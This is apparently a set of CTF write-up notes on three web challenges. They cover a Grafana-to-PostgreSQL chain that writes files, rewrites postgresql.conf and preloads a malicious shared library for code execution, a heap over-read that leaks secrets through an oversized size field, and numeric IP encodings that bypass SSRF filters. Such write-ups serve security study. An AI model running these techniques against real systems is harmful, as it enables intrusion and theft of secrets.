# DalCTF2026 — Web Patterns

Source: https://github.com/DalCTF/DalCTF2026

---

## 1. Grafana → PostgreSQL → .so injection → RCE (cards/grafana_jitsu)

**Pattern:** over-privileged PostgreSQL user inside a Grafana dashboard. `lo_from_bytea` + `lo_export` write arbitrary files to the DB host. Modify `postgresql.conf` to load a malicious `.so` at session start → RCE as the postgres user.

**Recon:**
- Find the dashboard's SQL query (Burp the refresh, look for query string).
- Test `SELECT version()` → likely PostgreSQL.
- Test `SELECT * FROM pg_file_read('/etc/passwd')` → confirms read.
- Test `SELECT * FROM pg_ls_dir('/')` → `/flag.bin` means you must EXECUTE it.

**Exploit chain:**
```sql
-- 1. read current postgresql.conf
SELECT * FROM pg_file_read('./postgresql.conf');
-- edit to add: dynamic_library_path = '/tmp:$libdir'; session_preload_libraries = 'expl.so'

-- 2. upload new conf (large objects use OIDs)
SELECT lo_from_bytea(133337, decode('<base64_conf>', 'base64'));
SELECT lo_export(133337, './postgresql.conf');

-- 3. compile malicious .so on attacker with matching PG version:
--    gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o expl.so expl.c
SELECT lo_from_bytea(133338, decode('<base64_so>', 'base64'));
SELECT lo_export(133338, '/tmp/expl.so');

-- 4. reload config + restart connection (triggers session_preload_libraries)
SELECT pg_reload_conf();
SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE usename = 'postgres';

-- 5. flag appears in home dir or DB
SELECT pg_read_file('./flag.txt');
```

**Versioning:** `SELECT version()` tells you the major version (e.g. 18); install matching `postgresql-server-dev-N` to compile a `.so` the running PG will accept.

---

## 2. HeartBleed-style HTTP over-read in custom JSON API (web/heart_pt7)

**Pattern:** API takes `{data: "x", size: y}` (JSON body), allocates `size` bytes server-side, copies `data` into it, and returns the full buffer. Bumping `size` reads past `data` into whatever happens to be on the heap. CVE-2014-0160 analogue in custom code.

**Triage:**
- See a request with a `size` field? Try 512, 1024, 4096.
- `strings` the response. Grep for `KEY=`, `SECRET=`, `MASTER_KEY=`, `FLAG`.
- Often leaks an AES key the server uses for downstream encryption.

---

## 3. SSRF via numeric IP encoding (web/67)

When the guard checks the raw URL string only, bypass with numeric forms of `127.0.0.1` (and same trick for any internal IP):

| Form        | Value                       |
| ----------- | --------------------------- |
| decimal     | `2130706433`                |
| hex         | `0x7f000001`                |
| octal       | `0177.0.0.1` / `017700000001` |
| short       | `127.1`                     |
| IPv6        | `[::1]`                     |

**Detect:** if `http://127.0.0.1/admin` is blocked but `http://2130706433/admin` succeeds, this is the bug.
